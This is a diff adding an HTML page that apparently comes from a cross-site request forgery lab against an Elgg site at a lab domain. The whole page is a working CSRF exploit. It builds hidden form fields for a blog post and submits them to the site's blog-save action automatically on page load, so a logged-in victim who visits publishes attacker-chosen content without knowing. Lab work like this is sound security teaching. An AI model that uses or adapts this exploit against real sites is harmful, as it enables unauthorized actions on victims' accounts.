@@ -1,0 +1,41 @@
+<html>
+<body>
+<h1>
+This page forges an HTTP POST request.
+</h1>
+<script type="text/javascript">
+function forge_post(){
+var fields;
+// The following are form entries need to be filled out by attackers.// The entries are made hidden, so the victim won't be able to see them.
+fields = "<input type='hidden' name='title' value='What is love?'>";
+fields += "<input type='hidden' name='excerpt' value='You may love yourself, but true love lies in loving all except you'>";
+fields += "<input type='hidden' name='description' value='The world has not been so loving to her children since thr birth of the plaent, she has gone through much turmoil.Let's not worsen in be creating malice amongst us'>";
+fields += "<input type='hidden' name='tags' value='philosophy,crappy_talk'>"
+fields += "<input type='hidden' name='comments_on' value='On'>"
+fields += "<input type='hidden' name='access_id' value='2'>";
+fields += "<input type='hidden' name='status' value='published'>";
+fields += "<input type='hidden' name='container_guid' value='42'>";
+fields += "<input type='hidden' name='save' value='Save'>";
+// Create a <form> element.
+var p = document.createElement("form");
+// Construct the form
+
+p.action = "http://www.csrflabelgg.com/action/blog/save";
+p.innerHTML = fields;
+p.method = "post";
+// Append the form to the current page.
+document.body.appendChild(p);
+// Submit the form
+p.submit();
+}
+// Invoke forge_post() after the page is loaded.
+window.onload = function() { forge_post();}
+</script>
+</body>
+</html>
+
+
+
+
+
+
